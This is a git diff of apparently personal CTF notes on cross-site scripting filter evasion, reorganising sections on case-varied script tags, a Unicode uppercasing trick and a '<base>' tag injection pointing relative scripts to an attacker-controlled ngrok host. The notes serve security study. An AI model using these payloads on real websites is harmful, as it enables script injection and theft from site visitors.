@@ -42,12 +42,7 @@ eval('ale'+'rt(1)')
 <sCrIpt> alert(1) </sCrIpt>
 ```
 
-## Input is being uppercased
-You can make use of HTML entity encodings to bypass the uppercasing. Refer to: `/CTF/tools/Web/html-entity-encoder.py`, which converts your input into HTML entities and URL encodes it.
-
-In addition, you can also take advantage of this. Certain characters (like ß and ﬃ) count as a single character, but become multiple characters when uppercased (SS and FFI). This is useful in very limited contexts, such as when the length of the initial string is used to iterate through the modifed (uppercased) string later on. By spamming the special characters at the start, you can "push" your XSS payload back, so any filters in place doesn't detect/remove your payload. Refer to: [blazing fast](https://smitop.com/p/dctf22-blazingfast/) (TODO: find characters that do the same for lowercasing)
-
-## `<base>` Tag Filter Evasion
+### Using `<base>` to bypass tight `<script>` filter
 
 ```html
 </h3> <base href="https://ngrok.io/abc">
@@ -55,6 +50,11 @@ In addition, you can also take advantage of this. Certain characters (like ß an
 
 This payload can be used provided that there are *existing* **relative** script tags on the page.  
 What this does is to change the relative root url of the script tag, so the script tags are now pointing to an attacker controlled source.
+
+
+## Input is being uppercased
+
+In addition, you can also take advantage of this. Certain characters (like ß and ﬃ) count as a single character, but become multiple characters when uppercased (SS and FFI). This is useful in very limited contexts, such as when the length of the initial string is used to iterate through the modifed (uppercased) string later on. By spamming the special characters at the start, you can "push" your XSS payload back, so any filters in place doesn't detect/remove your payload. Refer to: [blazing fast](https://smitop.com/p/dctf22-blazingfast/) (TODO: find characters that do the same for lowercasing)
 
 ## Relevant tools
 `/CTF/tools/Web/XSS/xssstrike`
